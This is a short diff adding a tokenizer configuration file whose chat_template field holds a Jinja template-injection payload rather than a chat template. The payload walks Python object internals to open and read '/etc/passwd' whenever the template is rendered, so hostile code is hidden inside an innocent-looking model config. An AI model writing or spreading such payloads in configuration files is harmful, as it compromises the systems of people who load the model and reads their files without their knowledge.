@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "BertTokenizer",
+  "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
+  "model_max_length": 512
+}
